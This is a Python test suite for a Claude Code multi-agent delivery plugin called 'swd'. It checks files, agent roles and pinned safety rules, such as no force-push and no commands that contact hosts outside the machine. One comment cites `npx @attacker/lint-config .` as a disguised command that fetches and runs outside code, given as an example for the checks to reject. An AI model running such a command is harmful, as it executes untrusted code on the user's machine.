"""Plugin structure checks. Run from the repo root: python3 -m unittest tests.test_structure"""
import json
import re
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent

REQUIRED_FILES = [
    ".claude-plugin/plugin.json",
    ".claude-plugin/marketplace.json",
    "README.md",
    "standards/run-folder.md",
    "scripts/check_run.py",
    "standards/production.md",
    "skills/build/SKILL.md",
    "scripts/swd-watch.sh",
    "scripts/swd-log.sh",
    "scripts/swd-dashboard.py",
    "scripts/swd-clean.py",
    "scripts/swd-findings.py",
    "scripts/swd-setup.py",
    "scripts/swd-test.py",
    "scripts/swd-pr.py",
    "scripts/swd-queue.py",
    "skills/follow/SKILL.md",
    "skills/queue/SKILL.md",
    "standards/quick.md",
    "skills/setup/SKILL.md",
    "hooks/hooks.json",
    "hooks/swd-mode.py",
    "skills/on/SKILL.md",
    "skills/off/SKILL.md",
    "standards/prototype.md",
    "standards/models.md",
]
REQUIRED_AGENTS = [
    "architect", "generalist-engineer", "backend-engineer", "frontend-engineer",
    "database-engineer", "devops-engineer", "docs-writer",
    "code-reviewer", "security-reviewer", "qa-engineer",
]
CHECKERS = ["code-reviewer", "security-reviewer", "qa-engineer"]
AGENT_SECTIONS = ["## Responsibility", "## Inputs", "## Process", "## Report", "## Never"]
PRINCIPAL = ROOT / "skills" / "build" / "SKILL.md"
PRINCIPAL_SECTIONS = [
    "## Preflight", "## Intake", "## Delivery mode", "## Design", "## Gate", "## Build",
    "## Fix loop", "## Final verification", "## Finish", "## Report", "## Resume", "## Never",
]
STANDARD_SECTIONS = [
    "## Priority", "## Builder process", "## Testing", "## Review",
    "## Security", "## Performance", "## Docs", "## Commits",
]


def frontmatter(path: Path) -> dict[str, str]:
    """The leading `---` block as key: value pairs; empty when there is none."""
    lines = path.read_text().splitlines()
    if not lines or lines[0].strip() != "---":
        return {}
    out = {}
    for line in lines[1:]:
        if line.strip() == "---":
            break
        key, sep, value = line.partition(":")
        if sep:
            out[key.strip()] = value.strip()
    return out


def agent_files() -> list[Path]:
    return sorted((ROOT / "agents").glob("*.md"))


class StructureTest(unittest.TestCase):
    def test_required_files_exist(self):
        missing = [f for f in REQUIRED_FILES if not (ROOT / f).is_file()]
        self.assertEqual(missing, [])

    def test_manifest(self):
        manifest = json.loads((ROOT / ".claude-plugin/plugin.json").read_text())
        self.assertEqual(manifest["name"], "swd")
        self.assertTrue(manifest.get("description"))
        self.assertTrue(manifest.get("version"))
        self.assertTrue(manifest["author"].get("name"))
        self.assertNotIn("email", manifest["author"])

    def test_marketplace(self):
        marketplace = json.loads((ROOT / ".claude-plugin/marketplace.json").read_text())
        plugin = json.loads((ROOT / ".claude-plugin/plugin.json").read_text())
        self.assertTrue(re.fullmatch(r"[a-z0-9]+(-[a-z0-9]+)*", marketplace["name"]))
        self.assertTrue(marketplace["owner"]["name"])
        self.assertNotIn("email", marketplace["owner"])
        self.assertEqual(len(marketplace["plugins"]), 1)
        self.assertEqual(marketplace["plugins"][0]["name"], plugin["name"])
        source = marketplace["plugins"][0]["source"]
        self.assertIsInstance(source, str)
        self.assertEqual((ROOT / source).resolve(), ROOT)
        self.assertNotIn("version", marketplace["plugins"][0])

    def test_readme_install_lines(self):
        marketplace = json.loads((ROOT / ".claude-plugin/marketplace.json").read_text())
        plugin = json.loads((ROOT / ".claude-plugin/plugin.json").read_text())
        readme = (ROOT / "README.md").read_text()
        self.assertRegex(readme, r"(?m)^/plugin marketplace add parthadcdev/swd-agents$")
        expected_line = "/plugin install %s@%s" % (plugin["name"], marketplace["name"])
        self.assertRegex(readme, r"(?m)^" + re.escape(expected_line) + r"$")
        install_lines = [line.strip() for line in readme.splitlines() if line.strip().startswith("/plugin install ")]
        self.assertEqual(install_lines, [expected_line])
        self.assertIn("claude --plugin-dir", readme)

    def test_required_agents_exist(self):
        missing = [a for a in REQUIRED_AGENTS if not (ROOT / "agents" / f"{a}.md").is_file()]
        self.assertEqual(missing, [])

    def test_agent_files_well_formed(self):
        for path in agent_files():
            with self.subTest(agent=path.name):
                fm = frontmatter(path)
                self.assertEqual(fm.get("name"), path.stem)
                self.assertTrue(fm.get("description"))
                self.assertTrue(fm.get("tools"))
                text = path.read_text()
                for section in AGENT_SECTIONS:
                    self.assertIn(section, text)

    def test_no_dangling_agent_references(self):
        known = {p.stem for p in agent_files()} | {"build", "on", "off", "setup", "follow", "queue"}
        for folder in ("skills", "standards"):
            for path in (ROOT / folder).rglob("*.md"):
                for name in re.findall(r"swd:([a-z-]+)", path.read_text()):
                    with self.subTest(file=str(path.relative_to(ROOT)), ref=name):
                        self.assertIn(name, known)

    def test_standards_have_required_sections(self):
        for mode in ("production", "prototype", "quick"):
            path = ROOT / "standards" / f"{mode}.md"
            if not path.is_file():
                continue
            text = path.read_text()
            for section in STANDARD_SECTIONS:
                with self.subTest(standard=mode, section=section):
                    self.assertIn(section, text)

    def test_checkers_cannot_edit(self):
        for name in CHECKERS:
            path = ROOT / "agents" / f"{name}.md"
            if not path.is_file():
                continue
            tools = [t.strip() for t in frontmatter(path).get("tools", "").split(",")]
            with self.subTest(agent=name):
                self.assertNotIn("Edit", tools)

    def test_principal_sections(self):
        text = PRINCIPAL.read_text()
        positions = [text.find(f"\n{s}\n") for s in PRINCIPAL_SECTIONS]
        self.assertNotIn(-1, positions, "a principal section is missing")
        self.assertEqual(positions, sorted(positions), "principal sections are out of order")

    def test_principal_frontmatter(self):
        fm = frontmatter(PRINCIPAL)
        self.assertEqual(fm.get("name"), "build")
        self.assertTrue(fm.get("description"))

    def test_principal_pins_review_focus(self):
        text = PRINCIPAL.read_text()
        self.assertIn("uncommitted", text)
        self.assertIn("check_run.py --plan", text)

    def test_pilot_lessons_are_pinned(self):
        # Each of these was a real failure in a pilot run.
        self.assertIn("git add -A", PRINCIPAL.read_text())
        self.assertIn("| Task | Role | Status | Attempts |", PRINCIPAL.read_text())

    def test_review_findings_are_pinned(self):
        # Each of these closes a hole the whole-branch review found in the principal's playbook.
        text = PRINCIPAL.read_text()
        for needle in (
            "Abandoned:",                      # a blocked run must not hijack every later /swd:build
            "resume it or start a new run",
            "If the mode changes",             # standards.md must follow a mode change at the gate
            "all `done` but not committed",    # resume must commit a finished, uncommitted wave
            "increment `Attempts`",            # resume must not reset the attempt count
            "check_run.py <run>",              # check the run in hand, not the latest by name
        ):
            with self.subTest(needle=needle):
                self.assertIn(needle, text)
        self.assertIn(".gitignore", (ROOT / "agents" / "architect.md").read_text())
        self.assertIn("cannot run", (ROOT / "agents" / "code-reviewer.md").read_text())

    def test_principal_watch_and_activity(self):
        text = PRINCIPAL.read_text()
        for needle in ("activity.md", "swd-watch.sh", "swd-log.sh", "swd-dashboard.py --watch --open", "HERDR_PANE_ID", "HC_TERMINAL_SOCKET"):
            self.assertIn(needle, text)

    def test_principal_reports_progress_in_conversation(self):
        text = " ".join(PRINCIPAL.read_text().split())
        for needle in (
            "also say one short line to the user in the conversation",
            "out of the total",
            "One line per moment, not per log call",
            "never replaces the log line",
        ):
            self.assertIn(needle, text)

    def test_principal_covers_both_modes(self):
        text = PRINCIPAL.read_text()
        for needle in ("Mode: prototype", "Mode: production", "W<n>:", "model"):
            self.assertIn(needle, text)

    def test_roster_matches_checker(self):
        import sys
        sys.path.insert(0, str(ROOT / "scripts"))
        import check_run
        builders = {p.stem for p in agent_files()} - {"architect", *CHECKERS}
        self.assertEqual(builders, check_run.BUILDERS)

    def test_principal_dispatches_security_review(self):
        self.assertIn("swd:security-reviewer", PRINCIPAL.read_text())

    def test_deferred_review_findings_are_pinned(self):
        # Each needle closes a minor finding from the whole-branch review.
        text = PRINCIPAL.read_text()
        for needle in (
            "`Attempts` reaches 4",            # when a re-plan triggers is no longer ambiguous
            "the last wave",                   # no wave QA straight before final QA
            "only one task",                   # no final reviews repeating a one-task run's reviews
            "files that changed",              # staging must not name a planned file that was never created
            "already has files",               # git init must not strand existing files outside the base
            "already exists",                  # an existing swd/<short-name> branch
        ):
            with self.subTest(needle=needle):
                self.assertIn(needle, text)
        self.assertIn("architect", (ROOT / "standards" / "production.md").read_text().split("## Performance")[1].split("## Docs")[0])
        for name in ("devops-engineer", "docs-writer"):
            with self.subTest(agent=name):
                self.assertNotIn("test first", (ROOT / "agents" / f"{name}.md").read_text())

    def test_run_integrity_lessons_are_pinned(self):
        # From the first real run on this repo: refused writes burned three attempts, and files
        # were changed by a writer no report accounted for.
        text = PRINCIPAL.read_text()
        for needle in (
            "write-check.txt",                  # prove a subagent can write before spending a run on it
            "check_run.py --seal <run>",        # fix the approved plan so a silent rewrite is caught
            "check_run.py --task",              # compare a returned task's changes with its report
            "do not decide it is acceptable",   # unexplained changes stop the run
            "refused by the permission system", # a refusal is a blocker, not a failed attempt
        ):
            with self.subTest(needle=needle):
                self.assertIn(needle, text)

    def test_worktree_and_finish_are_pinned(self):
        text = PRINCIPAL.read_text()
        for needle in (
            "git worktree add",                 # the run works in its own worktree
            "Work in: <work>",                  # every brief says where to work
            "Finish: merge-push",               # the three finishes, chosen at the gate
            "Finish: pr",
            "Finish: branch",
            "gh pr create",
            "git worktree remove",              # clean up afterwards
            "git branch -d",                    # only ever a merged branch
            "check_run.py --finish <run>",      # and the finish is checked
            "Never force-push",
        ):
            with self.subTest(needle=needle):
                self.assertIn(needle, text)
        self.assertNotIn("Never push, merge", text)
        # Pilots: builders told to chain `cd <worktree> && ...` had their shell refused. The principal
        # moves into the worktree once and agents inherit it, so their commands stay plain.
        self.assertIn("cd .swd/worktrees/<short-name>", text)
        self.assertNotIn(".git/info/exclude", text)  # that write is refused by the permission system
        for path in agent_files():
            with self.subTest(agent=path.name):
                agent = path.read_text()
                self.assertIn("`Work in:`", agent)
                self.assertIn("without `cd`", agent)
                # Pilots: an agent's first command set a shell variable and chained four more, and was refused.
                # The rule has to be in the agent's own instructions: it has not read standards.md yet.
                self.assertIn("Read tool", agent)
                self.assertIn("shell variable", agent)
        self.assertIn("without `cd`", (ROOT / "standards" / "run-folder.md").read_text())
        # A pilot's builder had one chained command refused and gave up as if it had no shell.
        shared = (ROOT / "standards" / "run-folder.md").read_text()
        self.assertIn("one plain command", shared)
        self.assertIn("Read tool", shared)
        self.assertIn("one plain command", text)
        self.assertIn("swd-clean.py <run>", text)  # housekeeping of stale worktrees and branches, every run
        # A pilot's team saw a bug in existing code, left it alone, and the principal never recorded it.
        self.assertIn("Finding:", text)
        # A pilot's QA wrote sample input files into the project. Scratch files belong to the run folder.
        self.assertIn("scratch/", (ROOT / "standards" / "run-folder.md").read_text())
        self.assertIn("scratch/", (ROOT / "agents" / "qa-engineer.md").read_text())

    def test_mode_hook_is_registered(self):
        hooks = json.loads((ROOT / "hooks" / "hooks.json").read_text())["hooks"]
        commands = [h["command"] for entry in hooks["UserPromptSubmit"] for h in entry["hooks"]]
        self.assertTrue(any("swd-mode.py" in c and "CLAUDE_PLUGIN_ROOT" in c for c in commands))
        for name in ("on", "off"):
            with self.subTest(skill=name):
                self.assertEqual(frontmatter(ROOT / "skills" / name / "SKILL.md").get("name"), name)

    def test_fast_lane_memory_and_setup_are_pinned(self):
        text = PRINCIPAL.read_text()
        for needle in (
            "Mode: quick",                       # the fast lane for small, low-risk changes
            "Project notes: ",                   # every brief points at the project's notes
            ".swd/project.md",
            ".swd/findings.md",
            "swd-findings.py <run>",
            "/swd:setup",                        # what to tell the user when writes or commands are refused
        ):
            with self.subTest(needle=needle):
                self.assertIn(needle, text)
        self.assertIn(".swd/project.md", (ROOT / "agents" / "architect.md").read_text())
        # A pilot's principal had the architect write the notes inside the worktree, where no later run finds them.
        self.assertIn("not in the worktree", text)
        self.assertIn("not in the worktree", (ROOT / "agents" / "architect.md").read_text())
        self.assertIn("quick", (ROOT / "agents" / "code-reviewer.md").read_text())

    def test_evidence_follow_and_queue_are_pinned(self):
        text = PRINCIPAL.read_text()
        for needle in (
            "Run tests with: ",                 # every builder brief names the recording test runner
            "swd-test.py <run> wave-",          # the suite between waves is a script, not an agent
            "swd-test.py <run> final",
            "swd-pr.py --wait",                 # a pull request's checks are watched before the run ends
            "/swd:follow",
            "one plain command per call",       # the principal's own commands, too
        ):
            with self.subTest(needle=needle):
                self.assertIn(needle, text)
        for mode in ("production", "prototype", "quick"):
            with self.subTest(standard=mode):
                self.assertIn("Run tests with:", (ROOT / "standards" / f"{mode}.md").read_text())
        self.assertIn("evidence/", (ROOT / "standards" / "run-folder.md").read_text())
        for name in ("follow", "queue"):
            with self.subTest(skill=name):
                self.assertEqual(frontmatter(ROOT / "skills" / name / "SKILL.md").get("name"), name)

    def test_model_guidance_and_outcome_are_pinned(self):
        def words(*parts: str) -> str:
            return " ".join((ROOT.joinpath(*parts)).read_text().split())

        models = words("standards", "models.md")
        for needle in (
            "Fable 5.2", "Opus 5.5", "Taken: 2026-11-15",
            "until Anthropic publishes newer guidance",
            "explicitly on every dispatch",
            "Opus 5.5 at `medium`",
            "Lower effort before a cheaper model",
            "cost per completed task",
            "Finish the whole task",
        ):
            with self.subTest(file="models.md", needle=needle):
                self.assertIn(needle, models)
        for section in STANDARD_SECTIONS:
            with self.subTest(file="models.md", heading=section):
                self.assertNotIn(section, models)
        shared = words("standards", "run-folder.md")
        for needle in ("## Outcome", "- Outcome:", "six fields", "staffing.md", "Plan judged:"):
            with self.subTest(file="run-folder.md", needle=needle):
                self.assertIn(needle, shared)
        architect = words("agents", "architect.md")
        for needle in ("## Outcome", "- Outcome:", "six fields", "as it will really appear"):
            with self.subTest(file="architect.md", needle=needle):
                self.assertIn(needle, architect)
        for name in ("qa-engineer", "code-reviewer"):
            with self.subTest(file=f"{name}.md"):
                text = words("agents", f"{name}.md")
                self.assertIn("## Outcome", text)
                # Two kinds of command: the project's own tests and builds are run as given
                # (they write caches and download dependencies); the limit is on every other.
                self.assertNotIn("Run only the commands that read", text)
                self.assertNotIn("Tests and builds in the worktree are run", text)
                for needle in (
                    "The commands you run are of two kinds, and every command is one or the other",
                    "Run them as given, in the worktree",
                    "a command that commits, pushes, publishes, deploys or sends anything to a "
                    "host outside this machine (any request counts: an upload, a download, a "
                    "`git fetch`, a name lookup) is never run, in the worktree or in a copy",
                    "Do not run one that changes anything outside the worktree and `scratch/`",
                    "they may download the project's declared dependencies",
                    "A command stopped by either of these two rules can be run against a copy "
                    "in `scratch/` instead; one on the never-run list cannot",
                    "Do not run in the worktree one whose purpose is to rewrite tracked files",
                    "Run `git status --short` before the Outcome's commands and again after them",
                    "the run folder's own records included",
                    "list it as not run, with the reason",
                ):
                    with self.subTest(file=f"{name}.md", needle=needle):
                        self.assertIn(needle, text)
        self.assertNotIn(
            "This limit is for the commands the `## Outcome` shows",
            words("agents", "code-reviewer.md"),
        )

    def test_t2_review_fixes_are_pinned(self):
        def words(*parts: str) -> str:
            return " ".join((ROOT.joinpath(*parts)).read_text().split())

        architect = words("agents", "architect.md")
        for needle in ("3. **Show the outcome.**", "4. **Write the contracts.**", "9. **Keep it small.**"):
            with self.subTest(file="architect.md", needle=needle):
                self.assertIn(needle, architect)
        shared = words("standards", "run-folder.md")
        for needle in (
            "A row per plan task is required",
            "the `plan`, `review` and `final` rows are written in the modes that have those dispatches",
            "its row is changed and the ruling goes in `decisions.md`",
        ):
            with self.subTest(file="run-folder.md", needle=needle):
                self.assertIn(needle, shared)
        self.assertIn(
            "A part that needs a file you do not own, or an action your role forbids",
            words("standards", "models.md"),
        )

    def test_principal_conducts_on_fable_and_staffs_the_plan(self):
        def words(*parts: str) -> str:
            return " ".join((ROOT.joinpath(*parts)).read_text().split())

        fm = frontmatter(PRINCIPAL)
        self.assertEqual(fm.get("model"), "fable")
        self.assertEqual(fm.get("effort"), "high")
        text = words("skills", "build", "SKILL.md")
        for needle in (
            "cat <plugin>/standards/<mode>.md <plugin>/standards/models.md "
            "<plugin>/standards/run-folder.md > <run>/standards.md",
            "Judge the plan", "Plan judged:", "Staff the plan", "staffing.md",
            "standards/models.md", "Goal: ", "raise the effort first", "## Outcome",
            "- Outcome:", "/model fable", "at `low` effort",
            "judge the amended plan, append a new `Plan judged:` line, add or change "
            "the `staffing.md` rows for the tasks the amendment added or changed, then seal again",
            "judge, staff and seal it as the Gate describes",
            "re-check, judge and staff the plan again (Design steps 2 to 5)",
            "in quick mode, correct the plan yourself",
            "only for the dispatches the mode has",
            "do not press it: the model is their choice. The approval below is still "
            "required either way.",
        ):
            with self.subTest(file="build", needle=needle):
                self.assertIn(needle, text)
        for needle in (
            "Model per dispatch", "| Mode | Architect, reviewers | Builders, QA |",
            "leave unset", "per completed task",
        ):
            with self.subTest(file="build", absent=needle):
                self.assertNotIn(needle, text)
        self.assertIn("Fable 5.2", words("skills", "queue", "SKILL.md"))
        self.assertNotIn("concerned about cost", words("skills", "queue", "SKILL.md"))
        readme = words("README.md")
        for needle in ("standards/models.md", "staffing.md", "/model fable"):
            with self.subTest(file="README.md", needle=needle):
                self.assertIn(needle, readme)
        manifest = json.loads((ROOT / ".claude-plugin/plugin.json").read_text())
        first = next(line for line in (ROOT / "CHANGELOG.md").read_text().splitlines() if line.startswith("## "))
        self.assertEqual(first, "## " + manifest["version"])

    def test_runs_from_before_0_8_0_and_the_docs_agree(self):
        def words(*parts: str) -> str:
            return " ".join((ROOT.joinpath(*parts)).read_text().split())

        wanted = {
            ("skills", "follow", "SKILL.md"): (
                "check, judge, staff and seal the amended plan as the build playbook's Gate describes",
                "A run from before 0.8.0", "`model` and `effort` on every dispatch",
                "the Design steps 4 and 5, Gate, Build, Fix loop and Never sections",
            ),
            ("skills", "build", "SKILL.md"): (
                "the `final` row is for final QA", "compares the result with the plan's `## Outcome`",
                "A run sealed before 0.8.0 has no `staffing.md`",
            ),
            ("standards", "run-folder.md"): (
                "the `final` row is for final QA", "below the last `Plan checksum:` line",
                "The check of a finished run does not, for a run that has a `Plan checksum:` line",
            ),
            ("standards", "quick.md"): ("compares the result with the plan's `## Outcome`",),
            ("README.md",): ("compares the result with the plan's outcome",),
            ("CHANGELOG.md",): ("Runs from before 0.8.0 keep working", "does not ask a sealed run for `## Outcome`"),
        }
        for parts, needles in wanted.items():
            for needle in needles:
                with self.subTest(file=parts[-1], needle=needle):
                    self.assertIn(needle, words(*parts))
        absent = {
            ("skills", "follow", "SKILL.md"): "task, check and seal the amended plan",
            ("skills", "build", "SKILL.md"): "in prototype mode there is no `review` row",
        }
        for parts, needle in absent.items():
            with self.subTest(file=parts[-1], absent=needle):
                self.assertNotIn(needle, words(*parts))

    def test_unattended_run_safeguards_are_pinned(self):
        def words(*parts: str) -> str:
            return " ".join((ROOT.joinpath(*parts)).read_text().split())

        for parts in (
            ("agents", "qa-engineer.md"), ("agents", "code-reviewer.md"),
            ("agents", "architect.md"), ("skills", "build", "SKILL.md"),
        ):
            with self.subTest(file=parts[-1], needle="host outside this machine"):
                self.assertIn("anything to a host outside this machine", words(*parts))
            # The two kinds of command are defined in the same terms in all four, so no reader
            # can place a command differently from another.
            for needle in (
                "anything to a host outside this machine (any request counts: an upload, "
                "a download, a `git fetch`, a name lookup)",
                "every command is one or the other",
                "**The project's own commands** are the plan's `Test command:`, each task's "
                "`- Check:`, and the lint, type check and build commands in the project notes. "
                "A command is one of these only when it is exactly as written there, and then "
                "it is one wherever it appears.",
                "**Every other command** is of the second kind",
                "A request to this machine itself, such as `localhost`, is allowed",
            ):
                with self.subTest(file=parts[-1], needle=needle):
                    self.assertIn(needle, words(*parts))
        # A reviewer read "contacts a host" as forbidding localhost: the host is always qualified.
        for parts in (
            ("agents", "qa-engineer.md"), ("agents", "code-reviewer.md"), ("agents", "architect.md"),
            ("skills", "build", "SKILL.md"), ("README.md",), ("CHANGELOG.md",),
        ):
            with self.subTest(file=parts[-1], absent="a host that is not 'outside this machine'"):
                self.assertEqual(
                    re.findall(r"\b(?:a|another|other) hosts?\b(?! outside this machine)", words(*parts)), []
                )
        # The reading of a project's own command asks as much of it as the never-run list asks of
        # every other: `npx @attacker/lint-config .` is a lint on its face and must fail it.
        for parts in (("agents", "architect.md"), ("skills", "build", "SKILL.md")):
            for needle in (
                "a test, lint, type check or build of this project and nothing else",
                "Apart from downloading the dependencies the project's own manifest or lock file "
                "already declares, it must not send anything to a host outside this machine, "
                "fetch and run code the project does not declare, or change anything outside "
                "the worktree.",
                "the script or config it names",
                "fails the reading",
            ):
                with self.subTest(file=parts[-1], needle=needle):
                    self.assertIn(needle, words(*parts))
            with self.subTest(file=parts[-1], absent="download permission with no edge"):
                self.assertNotIn("may download the project's declared dependencies", words(*parts))
        # The two checkers hold the same block, word for word.
        blocks = []
        for name in ("qa-engineer", "code-reviewer"):
            text = words("agents", f"{name}.md")
            start, end = text.find("The commands you run are of two kinds"), text.find("it fails the run.")
            self.assertTrue(0 <= start < end, f"{name}.md has no command block")
            blocks.append(text[start:end])
        self.assertEqual(blocks[0], blocks[1])
        wanted = {
            ("skills", "build", "SKILL.md"): (
                "Then read every command a checker will run",
                "Each must be a test, lint, type check or build of this project and nothing else, "
                "and must not commit, push, publish or deploy",
                "A command you cannot tell this about from reading it and the script or config "
                "it names fails the reading",
                "Each command the `## Outcome` shows must also be one an acceptance criterion "
                "needs; that test is for the Outcome's commands only",
                "a GitHub issue or a pull request comment",
                "Never staff a checker below a builder",
                "this seal needs no new `Plan judged:` line",
                "A run sealed before 0.8.1 has no `Staffing checksum:` line",
            ),
            ("skills", "follow", "SKILL.md"): (
                "no checker's model below a builder's", "the `review` row for its reviewers (the `final` row in a quick run)",
            ),
            ("standards", "run-folder.md"): (
                "Staffing checksum: <sha256>", "The seal requires the `final` row in every mode",
                "a row naming two agents is compared once",
            ),
            ("README.md",): (
                "never runs on a model below a builder's",
                "sends anything to a host outside this machine",
            ),
            ("CHANGELOG.md",): (
                "Staffing checksum:",
                "that commits, pushes, publishes, deploys or sends anything to a host outside "
                "this machine (any request counts: an upload, a download, a `git fetch`, a name "
                "lookup), in the worktree or in a copy",
                "a test, lint, type check or build of this project and nothing else",
                "fetch and run code the project does not declare",
                "the script or config it names fails the reading",
            ),
        }
        for parts, needles in wanted.items():
            for needle in needles:
                with self.subTest(file=parts[-1], needle=needle):
                    self.assertIn(needle, words(*parts))
        for parts in (("skills", "build", "SKILL.md"), ("standards", "run-folder.md")):
            with self.subTest(file=parts[-1], table="final row"):
                self.assertIn("| final | qa-engineer | opus | low |", words(*parts))
                self.assertNotIn("| final | qa-engineer | sonnet", words(*parts))


if __name__ == "__main__":
    unittest.main()
